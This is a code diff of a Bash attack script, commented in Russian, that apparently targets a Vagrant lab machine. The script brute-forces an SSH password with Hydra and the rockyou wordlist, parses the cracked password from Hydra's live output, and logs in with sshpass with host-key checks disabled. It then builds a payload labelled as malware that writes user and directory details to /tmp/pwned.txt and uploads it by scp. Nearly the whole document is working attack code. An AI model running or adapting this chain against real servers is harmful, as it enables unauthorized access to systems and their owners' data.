@@ -7,47 +7,54 @@ TARGET_USER="vagrant"
 WORDLIST="rockyou.txt"
 PAYLOAD_FILE="payload.sh" 
 LOG_FILE="attack_log.txt"
+PASSWORD=""
 
 echo "[*] Начинаем атаку на $TARGET_IP:$TARGET_PORT"
 echo "[*] $(date)" >> $LOG_FILE
 
 # Bruteforce SSH пароля с помощью Hydra
 echo "[+] 1. Bruteforce пароля с помощью Hydra..."
-hydra -l $TARGET_USER -P $WORDLIST -o hydra_results.txt \
-    -f ssh://$TARGET_IP:$TARGET_PORT 2>&1 | tee -a $LOG_FILE
+# Запускаем Hydra и парсим вывод в реальном времени
+while IFS= read -r line; do
+    echo "$line" | tee -a $LOG_FILE
+    
+    # Ищем строку с найденным паролем
+    # Формат: [22][ssh] host: 33.57.84.200   login: root   password: PASSWORD123
+    if echo "$line" | grep -q "\[22\]\[ssh\]"; then
+        PASSWORD=$(echo "$line" | grep -oP 'password:\s*\K[^\]]*' | xargs)
+        if [ ! -z "$PASSWORD" ]; then
+            echo "[+] Пароль найден: $PASSWORD" | tee -a $LOG_FILE
+            break
+        fi
+    fi
+done < <(hydra -l $TARGET_USER -P $WORDLIST -v \
+    ssh://$TARGET_IP:$TARGET_PORT 2>&1)
 
 # Проверяем, найден ли пароль
-if [ ! -f hydra_results.txt ] || ! grep -q "password" hydra_results.txt; then
-    echo "[-] Пароль не найден"
-    exit 1
-fi
-
-# Извлекаем пароль из результатов Hydra
-PASSWORD=$(grep -oP "password: \K.*" hydra_results.txt | head -1)
-
 if [ -z "$PASSWORD" ]; then
-    echo "[-] Не удалось извлечь пароль"
+    echo "[-] Пароль не найден" | tee -a $LOG_FILE
     exit 1
 fi
 
 echo "[+] Пароль найден: $PASSWORD" | tee -a $LOG_FILE
 
 # Проверяем подключение
-echo "[+] 2. Проверка подключения SSH..."
+echo "[+] 2. Проверка подключения SSH..." | tee -a $LOG_FILE
+sleep 2
 sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no \
     -o UserKnownHostsFile=/dev/null \
     -o ConnectTimeout=5 \
     $TARGET_USER@$TARGET_IP "echo 'SSH connection successful'" 2>&1 | tee -a $LOG_FILE
 
 if [ $? -ne 0 ]; then
-    echo "[-] Не удалось подключиться по SSH"
+    echo "[-] Не удалось подключиться по SSH" | tee -a $LOG_FILE
     exit 1
 fi
 
 echo "[+] SSH подключение успешно!" | tee -a $LOG_FILE
 
 # Загружаем и выполняем payload
-echo "[+] 3. Загрузка вредоноса на целевой сервер..."
+echo "[+] 3. Загрузка вредоноса на целевой сервер..." | tee -a $LOG_FILE
 
 # Создаём простой payload, если его нет
 if [ ! -f "$PAYLOAD_FILE" ]; then
@@ -59,6 +66,7 @@ echo "User: $(whoami)" >> /tmp/pwned.txt
 echo "Current directory: $(pwd)" >> /tmp/pwned.txt
 EOF
     chmod +x $PAYLOAD_FILE
+    echo "[+] Payload создан: $PAYLOAD_FILE" | tee -a $LOG_FILE
 fi
 
 # Загружаем payload через SCP
@@ -67,7 +75,7 @@ sshpass -p "$PASSWORD" scp -o StrictHostKeyChecking=no \
     $PAYLOAD_FILE $TARGET_USER@$TARGET_IP:/tmp/payload.sh 2>&1 | tee -a $LOG_FILE
 
 if [ $? -ne 0 ]; then
-    echo "[-] Не удалось загрузить файл"
+    echo "[-] Не удалось загрузить файл" | tee -a $LOG_FILE
     exit 1
 fi
 
